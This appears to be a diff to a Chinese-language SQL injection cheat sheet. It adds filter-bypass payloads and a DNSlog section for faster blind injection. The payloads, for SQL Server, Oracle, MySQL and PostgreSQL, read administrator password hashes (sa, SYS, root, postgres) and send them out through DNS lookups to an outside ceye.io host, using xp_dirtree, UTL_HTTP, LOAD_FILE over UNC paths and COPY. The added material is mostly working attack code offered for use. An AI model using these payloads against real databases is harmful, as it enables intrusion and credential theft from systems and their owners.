@@ -2,7 +2,11 @@
 
 ## 语法参考与小技巧
 
-### 行间注释 
+### desc查询表结构语法
+
+ DESC tbl_name [col_name | wild]
+
+### 行间注释
 
 - `--`
 
@@ -75,6 +79,14 @@
 
 ## 绕过
 
+### 过滤表名的情况下查询
+
+```mysql
+select a from b='' or substr((hex((select group_concat(a) from (select 1,2,3`a`,4,5 union select * from users)`b`))),71,1)=0#
+```
+
+
+
 ### 关键字 %00绕过
 
 •SELECT :SE\x00LECT  (\x00指ASCII为0的字符） 
@@ -83,7 +95,11 @@
 
 1.join
 
+`select 'a','b','c','d' union select * from ((select 1)a join (select 2)b join (select 3)c join (select 4)d);`
+
 2.扩号:mid('a'from(1))
+
+
 
 ### 绕过空格限制
 
@@ -381,11 +397,65 @@ set global log_output='file';   -- 设置输出类型为file
 
 ```
 
-## 
+
 
 ## HSQL
 
 HQL:hibernate query language 即hibernate提供的面向对象的查询语言
 
 https://segmentfault.com/a/1190000013568216
+
+## 渗透技巧:使用dnslog加快盲注速度
+
+![](http://pic.c1imber.top/blog/180630/8aC6fb4hHB.png?imageslim)
+
+### i. SQL Server
+
+```sql
+DECLARE @host varchar(1024);
+SELECT @host=(SELECT TOP 1
+master.dbo.fn_varbintohexstr(password_hash)
+FROM sys.sql_logins WHERE name='sa')
++'.ip.port.b182oj.ceye.io';
+EXEC('master..xp_dirtree
+"\\'+@host+'\foobar$"');
+```
+
+### ii. Oracle
+
+```sql
+SELECT UTL_INADDR.GET_HOST_ADDRESS('ip.port.b182oj.ceye.io');
+SELECT UTL_HTTP.REQUEST('http://ip.port.b182oj.ceye.io/oracle') FROM DUAL;
+SELECT HTTPURITYPE('http://ip.port.b182oj.ceye.io/oracle').GETCLOB() FROM DUAL;
+SELECT DBMS_LDAP.INIT(('oracle.ip.port.b182oj.ceye.io',80) FROM DUAL;
+SELECT DBMS_LDAP.INIT((SELECT password FROM SYS.USER$ WHERE name='SYS')||'.ip.port.b182oj.ceye.io',80) FROM DUAL;
+```
+
+### iii. MySQL
+
+```sql
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM mysql.user WHERE user='root' LIMIT 1),'.mysql.ip.port.b182oj.ceye.io\\abc'));
+#这个必须在windows系统下因为unc是windows所特有的
+#具有load_file权限
+```
+
+### iv. PostgreSQL
+
+```sql
+DROP TABLE IF EXISTS table_output;
+CREATE TABLE table_output(content text);
+CREATE OR REPLACE FUNCTION temp_function()
+RETURNS VOID AS $
+DECLARE exec_cmd TEXT;
+DECLARE query_result TEXT;
+BEGIN
+SELECT INTO query_result (SELECT passwd
+FROM pg_shadow WHERE usename='postgres');
+exec_cmd := E'COPY table_output(content)
+FROM E\'\\\\\\\\'||query_result||E'.psql.ip.port.b182oj.ceye.io\\\\foobar.txt\'';
+EXECUTE exec_cmd;
+END;
+$ LANGUAGE plpgsql SECURITY DEFINER;
+SELECT temp_function();
+```
 
